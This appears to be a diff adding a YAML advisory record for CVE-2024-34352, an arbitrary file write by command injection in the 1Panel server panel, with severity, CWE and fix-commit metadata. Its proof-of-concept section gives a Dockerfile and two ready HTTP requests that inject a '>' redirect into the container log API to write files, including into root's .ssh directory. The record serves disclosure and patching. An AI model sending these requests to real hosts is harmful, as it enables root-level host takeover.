@@ -1,0 +1,103 @@
+advisory_id: GHSA-f8ch-w75v-c847
+datasource_id: github_osv/GHSA-f8ch-w75v-c847
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-f8ch-w75v-c847/GHSA-f8ch-w75v-c847.json
+aliases:
+  - CVE-2024-34352
+summary: |
+  1Panel arbitrary file write vulnerability
+  ### Summary
+  There are many command injections in the project, and some of them are not well filtered, leading to arbitrary file writes, and ultimately leading to RCEs.
+  We can use the following mirror configuration write symbol `>` to achieve arbitrary file writing
+
+  ### PoC
+  Dockerfile
+  ```
+  FROM bash:latest
+
+  COPY echo.sh /usr/local/bin/echo.sh
+  RUN chmod +x /usr/local/bin/echo.sh
+  CMD ["echo.sh"]
+  ```
+  echo.sh
+  ```
+  #!/usr/local/bin/bash
+  echo "Hello, World!"
+  ```
+  Build this image like this, upload it to dockerhub, and then 1panel pulls the image to build the container
+  Send the following packet, taking care to change the containerID to the malicious container we constructed
+
+  ```
+  GET /api/v1/containers/search/log?container=6e6308cb8e4734856189b65b3ce2d13a69e87d2717898d120dac23b13b6f1377%3E%2Ftmp%2F1&since=all&tail=100&follow=true HTTP/1.1
+  Host: xxxx:42713
+  Connection: Upgrade
+  Pragma: no-cache
+  Cache-Control: no-cache
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+  Upgrade: websocket
+  Origin: http://xxx:42713
+  Sec-WebSocket-Version: 13
+  Accept-Encoding: gzip, deflate, br
+  Accept-Language: zh-CN,zh;q=0.9
+  Cookie: psession=88e51389-ddce-468c-a3be-51c5b2cb2d9d
+  Sec-WebSocket-Key: FdXBKFviqO4+LSEoucITLA==
+  ```
+  Then you can write any customized file to, for example, a ssh key, and generally the application is run with root privileges
+  ```
+  GET /api/v1/containers/search/log?container=6e6308cb8e4734856189b65b3ce2d13a69e87d2717898d120dac23b13b6f1377%3E%2Froot%2F.ssh%2f1&since=all&tail=100&follow=true HTTP/1.1
+  Host: xxx:42713
+  Connection: Upgrade
+  Pragma: no-cache
+  Cache-Control: no-cache
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+  Upgrade: websocket
+  Origin: http://xxx:42713
+  Sec-WebSocket-Version: 13
+  Accept-Encoding: gzip, deflate, br
+  Accept-Language: zh-CN,zh;q=0.9
+  Cookie: psession=88e51389-ddce-468c-a3be-51c5b2cb2d9d
+  Sec-WebSocket-Key: FdXBKFviqO4+LSEoucITLA==
+  ```
+  Or write a timed task to execute any command.
+  ### Impact
+  The ability to write arbitrary files on the host where the service is deployed can lead to a host takeover
+impacted_packages:
+  - purl: pkg:github/1panel-dev/1panel
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/1panel-dev/1panel
+        commit: e037b69f52799e110af8e98f39a3627ad0285ea6
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-f8ch-w75v-c847/GHSA-f8ch-w75v-c847.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-77
+references:
+  - url: https://github.com/1Panel-dev/1Panel
+    reference_type:
+    reference_id:
+  - url: https://github.com/1Panel-dev/1Panel/commit/e037b69f52799e110af8e98f39a3627ad0285ea6
+    reference_type:
+    reference_id:
+  - url: https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-f8ch-w75v-c847
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-34352
+    reference_type:
+    reference_id:
+  - url: https://pkg.go.dev/vuln/GO-2024-2830
+    reference_type:
+    reference_id:
+exploits: []
